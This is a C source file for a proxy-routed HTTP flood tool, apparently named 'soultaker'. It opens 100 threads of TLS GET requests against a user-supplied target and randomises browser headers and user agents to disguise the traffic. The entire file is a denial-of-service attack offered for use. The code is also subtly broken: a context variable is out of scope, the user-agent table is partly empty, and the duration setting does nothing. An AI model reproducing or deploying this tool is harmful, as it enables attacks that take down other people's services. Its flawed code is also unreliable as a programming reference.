#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_HEADERS 10
#define MAX_USER_AGENTS 40
#define MAX_THREADS 100

typedef struct {
    char *header;
    char *value;
} Header;

typedef struct {
    char *user_agent;
} UserAgent;

Header headers[MAX_HEADERS] = {
    {"Host", "tarsoul_soultaker"},
    {"Connection", "close"},
    {"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"},
    {"Accept-Encoding", "gzip, deflate, br"},
    {"Accept-Language", "en-US,en;q=0.9"},
    {"Cache-Control", "max-age=0"},
    {"Sec-Fetch-Dest", "document"},
    {"Sec-Fetch-Mode", "navigate"},
    {"Sec-Fetch-Site", "none"},
    {"Upgrade-Insecure-Requests", "1"},
};

UserAgent user_agents[MAX_USER_AGENTS] = {
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4634.110 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4634.110 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"},
    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"},
    {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"},
};

typedef struct {
    char *url;
    int port;
    int duration;
    char *proxyfile;
} AttackParams;

void *perform_attack(void *params);

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_client_method();

    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    SSL_CTX_set_ecdh_auto(ctx, 1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: ./soultaker.c <target> <port> <duration> <proxyfile.txt>\n");
        printf("Script by tarsoul\n");
        return 1;
    }

    srand(time(NULL)); // Seed the random number generator

    initialize_openssl();
    SSL_CTX *ctx = create_context();
    configure_context(ctx);

    AttackParams params;
    params.url = argv[1];
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.proxyfile = argv[4];

    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, perform_attack, (void *)&params) != 0) {
            printf("Error: Could not create thread.\n");
            return 1;
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack successfully completed.\n");
    printf("Script by tarsoul\n");

    cleanup_openssl();

    return 0;
}

void shuffle_headers() {
    for (int i = MAX_HEADERS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        Header temp = headers[i];
        headers[i] = headers[j];
        headers[j] = temp;
    }
}

void shuffle_user_agents() {
    for (int i = MAX_USER_AGENTS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        UserAgent temp = user_agents[i];
        user_agents[i] = user_agents[j];
        user_agents[j] = temp;
    }
}

void *perform_attack(void *params) {
    AttackParams *attack_params = (AttackParams *)params;

    FILE *proxy_file = fopen(attack_params->proxyfile, "r");
    if (!proxy_file) {
        printf("Error: Could not open proxy file.\n");
        return NULL;
    }

    char ip[16], port_str[6];
    while (fscanf(proxy_file, "%[^:]:%s", ip, port_str) == 2) {
        int proxy_port = atoi(port_str);
        struct sockaddr_in proxy_addr;
        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(proxy_port);
        if (inet_pton(AF_INET, ip, &proxy_addr.sin_addr) <= 0) {
            printf("Error: Invalid proxy IP.\n");
            continue;
        }

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            printf("Error: Could not create socket.\n");
            continue;
        }

        if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
            printf("Error: Could not connect to proxy.\n");
            close(sock);
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) <= 0) {
            printf("Error: Could not create SSL connection.\n");
            SSL_free(ssl);
            close(sock);
            continue;
        }

        char request[8192];
        sprintf(request, "GET %s HTTP/1.1\r\n", attack_params->url);
        shuffle_headers();
        for (int i = 0; i < MAX_HEADERS; i++) {
            sprintf(request + strlen(request), "%s: %s\r\n", headers[i].header, headers[i].value);
        }
        shuffle_user_agents();
        sprintf(request + strlen(request), "User-Agent: %s\r\n", user_agents[rand() % MAX_USER_AGENTS].user_agent);
        sprintf(request + strlen(request), "Connection: close\r\n\r\n");

        SSL_write(ssl, request, strlen(request));

        char response[4096];
        int bytes_read = 0;
        while ((bytes_read = SSL_read(ssl, response + bytes_read, sizeof(response) - bytes_read - 1)) > 0) {
            response[bytes_read] = 0;
        }

        SSL_free(ssl);
        close(sock);
    }

    fclose(proxy_file);

    for (int i = 0; i < attack_params->duration; i++) {
        sleep(1);
    }

    return NULL;
}
